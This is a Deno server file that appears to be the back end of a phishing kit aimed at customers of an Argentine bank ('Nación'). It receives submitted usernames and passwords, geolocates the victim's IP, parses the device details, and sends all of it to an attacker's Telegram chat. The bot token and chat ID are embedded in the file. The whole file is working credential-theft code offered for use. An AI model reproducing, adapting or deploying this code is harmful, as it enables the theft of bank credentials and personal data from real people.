import { UAParser } from "npm:ua-parser-js@1.0.37";

const TELEGRAM_BOT_TOKEN = "8038236408:AAHJZhjnTnh6KfNNFQcRjkcjR2SVL1uUTrQ";
const TELEGRAM_CHAT_ID = "7642917755";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

async function getLocationInfo(ip: string) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    if (!response.ok) {
      throw new Error('Failed to fetch location info');
    }
    return await response.json();
  } catch (error) {
    console.error("Error fetching location:", error);
    return null;
  }
}

async function sendToTelegram(message: string) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(`Telegram API error: ${JSON.stringify(errorData)}`);
    }

    return await response.json();
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    throw error;
  }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { username, password } = await req.json();
    const userAgent = req.headers.get("user-agent") || "Unknown";
    const ip = req.headers.get("x-forwarded-for")?.split(',')[0] || req.headers.get("cf-connecting-ip") || "Unknown";
    
    const parser = new UAParser(userAgent);
    const device = parser.getDevice();
    const browser = parser.getBrowser();
    const os = parser.getOS();
    
    const locationInfo = await getLocationInfo(ip);
    const now = new Date();

    const deviceInfo = [
      device.vendor,
      device.model,
      os.name,
      os.version,
      browser.name,
      browser.version
    ].filter(Boolean).join(' ');

    const message = `🏦 Nación

👤 Usuario: ${username}
🔑 Clave: ${password}

📍 Ubicación:
🌆 Ciudad: ${locationInfo?.city || 'Desconocida'}
🏢 Región: ${locationInfo?.regionName || 'Desconocida'}
🌎 País: ${locationInfo?.country || 'Desconocido'}
📮 CP: ${locationInfo?.zip || 'Desconocido'}
🌐 IP: ${ip}
📱 Dispositivo: ${deviceInfo}
⏰ Hora: ${now.toLocaleDateString('es-AR')}, ${now.toLocaleTimeString('es-AR')}`;

    const result = await sendToTelegram(message);
    
    return new Response(
      JSON.stringify({ success: true, result }),
      {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error in request handler:", error);
    
    return new Response(
      JSON.stringify({ 
        error: error.message,
        success: false 
      }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});